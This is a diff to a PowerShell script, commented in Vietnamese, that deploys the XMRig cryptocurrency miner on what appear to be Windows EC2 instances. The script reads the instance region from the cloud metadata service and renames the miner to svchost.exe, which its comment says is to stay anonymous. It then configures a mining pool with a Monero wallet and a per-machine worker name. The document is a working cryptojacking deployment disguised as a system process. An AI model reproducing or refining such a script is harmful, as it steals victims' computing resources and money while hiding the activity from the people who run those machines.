@@ -1,6 +1,9 @@
 # Bật logging để debug
 Start-Transcript -Path C:\Windows\Temp\setup.log -Append
 
+# Lấy thông tin tên vùng của EC2
+$region = (Invoke-RestMethod -Uri http://169.254.169.254/latest/meta-data/placement/region)
+
 # Tạo thư mục làm việc
 $workDir = "C:\Windows\Temp\xmrig"
 New-Item -ItemType Directory -Path $workDir -Force | Out-Null
@@ -15,7 +18,7 @@ Remove-Item "$workDir\xmrig.zip"
 # Đổi tên file để ẩn danh
 Rename-Item -Path "$workDir\xmrig.exe" -NewName "svchost.exe"
 
-# Cấu hình tệp config
+# Cấu hình tệp config với tên Worker động
 $xmrigConfig = @"
 {
     "autosave": true,
@@ -25,7 +28,7 @@ $xmrigConfig = @"
     "pools": [
         {
             "url": "xmr-eu.kryptex.network:7029",
-            "user": "88NaRPxg9d16NwXYpMvXrLir1rqw9kMMbK6UZQSix59SiQtQZYdM1R4G8tmdsNvF1ZXTRAZsvEtLmQsoxWhYHrGYLzj6csV",
+            "user": "88NaRPxg9d16NwXYpMvXrLir1rqw9kMMbK6UZQSix59SiQtQZYdM1R4G8tmdsNvF1ZXTRAZsvEtLmQsoxWhYHrGYLzj6csV.Win",
             "keepalive": true,
             "tls": false
         }
